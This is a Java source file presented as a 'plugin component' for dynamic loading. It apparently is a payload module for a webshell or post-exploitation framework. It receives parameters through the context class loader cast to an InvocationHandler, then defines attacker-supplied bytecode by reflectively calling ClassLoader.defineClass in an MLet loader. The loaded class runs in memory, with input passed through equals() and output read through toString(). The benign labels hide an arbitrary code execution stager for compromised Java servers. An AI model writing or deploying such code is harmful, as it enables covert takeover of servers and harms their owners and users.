package org.leo.core.component;

import javax.management.loading.MLet;
import java.lang.reflect.Method;
import java.net.URL;
import java.util.HashMap;

/**
 * 插件组件
 * 提供动态加载和执行Java插件功能，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.1
 */
public class PluginComponent implements Runnable {

    
    private HashMap params;
    private HashMap results;

    
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        byte[] bytecode = (byte[]) params.get("pluginBytecode");
        HashMap pluginParam = (HashMap) params.get("pluginParam");
        
        // 获取defineClass方法
        Method defineClassMethod = ClassLoader.class.getDeclaredMethod(
            "defineClass", 
            new Class[]{String.class, byte[].class, int.class, int.class}
        );
        defineClassMethod.setAccessible(true);
        
        // 创建MLet类加载器并加载插件
        MLet mlet = new MLet(new URL[0], Thread.currentThread().getContextClassLoader());
        Class<?> pluginClass = (Class<?>) defineClassMethod.invoke(
            mlet, 
            new Object[]{null, bytecode, 0, bytecode.length}
        );
        
        // 创建插件实例并执行
        Object pluginInstance = pluginClass.newInstance();
        pluginInstance.equals(pluginParam);
        
        // 获取执行结果
        String result = pluginInstance.toString();
        results.put("result", result);
        results.put("code", 200);
    }
}
